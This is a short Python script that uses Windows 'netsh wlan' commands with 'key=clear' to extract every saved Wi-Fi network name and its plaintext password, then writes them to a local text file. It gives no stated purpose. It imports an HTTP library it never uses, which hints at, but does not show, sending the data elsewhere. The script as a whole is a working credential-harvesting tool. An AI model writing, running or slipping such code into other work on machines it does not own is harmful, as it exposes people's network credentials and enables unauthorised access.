import subprocess
import re
import requests

wlan = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output = True).stdout.decode()
profile_names = (re.findall("All User Profile     : (.*)\r", wlan)) # find all the profile names

wifi_list = list()

if len(profile_names) != 0:
    for profile in profile_names:

        wifi_profile = dict()
        
        profile_info = subprocess.run(["netsh", "wlan", "show", "profile", profile], capture_output=True).stdout.decode()

        if re.search("Security key           : Absent", profile_info):
            continue
        
        # capture SSID & password
        else:
            wifi_profile["SSID"] = profile

            pass_info = subprocess.run(["netsh", "wlan", "show", "profile", profile, "key=clear"], capture_output=True).stdout.decode()
            password = (re.search("Key Content            : (.*)\r", pass_info))
            wifi_profile["Password"] = password[1]

        wifi_list.append(wifi_profile)

# write results to a text file
with open("Wifi.txt", "+w") as wl:
    for item in wifi_list:
        wl.write(f"SSID: {item['SSID']}\nPassword: {item['Password']}\n\n")
